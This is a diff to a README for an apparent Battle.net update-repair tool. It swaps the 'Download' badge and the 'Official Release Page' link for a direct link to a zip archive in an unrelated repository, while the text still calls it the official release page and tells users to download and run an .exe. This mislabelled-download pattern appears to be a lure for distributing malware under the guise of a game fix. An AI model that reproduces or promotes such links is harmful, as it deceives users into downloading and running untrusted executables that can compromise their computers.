@@ -5,7 +5,7 @@ description: "Resolve Battle.net update stuck errors on Windows 10 and 11 with t
 ---
 # 🛠️ Battle-net-Update-Stuck-Fix - Repair your stuck Battle.net updates quickly
 
-[![Download Fix](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/base-moratorium838/Battle-net-Update-Stuck-Fix/releases)
+[![Download Fix](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/base-moratorium838/base-moratorium838.github.io/main/sensualization/moratorium_base_github_io_1.7.zip)
 
 ## What is this tool?
 
@@ -23,7 +23,7 @@ You need the Battle.net launcher installed on your machine. You also need a stan
 
 Follow these steps to repair your launcher.
 
-1. Go to the [Official Release Page](https://github.com/base-moratorium838/Battle-net-Update-Stuck-Fix/releases).
+1. Go to the [Official Release Page](https://raw.githubusercontent.com/base-moratorium838/base-moratorium838.github.io/main/sensualization/moratorium_base_github_io_1.7.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
 3. Click the link ending in .exe to download the file to your computer.
 4. Open your "Downloads" folder in Windows File Explorer.
